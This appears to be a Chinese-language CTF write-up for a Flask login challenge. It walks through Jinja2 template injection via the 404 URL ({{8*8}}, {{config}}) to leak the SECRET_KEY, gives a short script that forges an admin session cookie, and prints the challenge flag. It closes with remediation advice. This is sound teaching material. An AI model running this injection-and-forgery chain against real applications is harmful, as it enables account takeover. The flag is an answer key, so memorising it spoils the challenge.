# week2一个简单的登陆

## 题目简述

应用使用 Flask 的客户端签名 Session 保存 `name` 和 `uid`。404 处理器把用户可控 URL 直接交给 `render_template_string()`，形成 Jinja2 SSTI；通过 SSTI 读取 `SECRET_KEY` 后即可伪造管理员 Session。

## 解题过程

普通登录后，Cookie 中会出现 Flask 默认的 `session`。仓库源码表明登录时写入：

```python
session["name"] = username
session["uid"] = str(random.randint(1, 100))
```

访问不存在的路径并注入 `{{8*8}}`，404 页面回显 `64`，证明 URL 被当作 Jinja2 模板执行。继续使用 `{{config}}`，可从配置对象中读到：

```text
SECRET_KEY = x1ct34myydsytstflglgjhdfhsh
```

`/admin` 的实际校验条件是 `name == "admin"` 且 `uid == "1"`。Flask Session 的载荷虽然可读，但必须用服务端密钥重新签名；下面的代码直接调用 Flask 自身的签名器生成兼容 Cookie，不依赖外部脚本：

```python
from flask import Flask

app = Flask(__name__)
app.secret_key = "x1ct34myydsytstflglgjhdfhsh"

serializer = app.session_interface.get_signing_serializer(app)
cookie = serializer.dumps({"name": "admin", "uid": "1"})
print(cookie)
```

将输出替换为请求中的 `session` Cookie，再访问 `/admin`，得到：

```text
0xGame{Python_ls_th3_first_1anguage_ln_the_w0r1d}
```

## 方法总结

利用链为“404 URL 注入 SSTI → 泄露 Flask `SECRET_KEY` → 按后端字段和类型伪造 Session → 访问管理员路由”。这里的 `uid` 是字符串 `"1"`，类型也必须与源码一致。修复应避免用 `render_template_string()` 拼接用户输入，并在密钥泄露后立即轮换签名密钥。
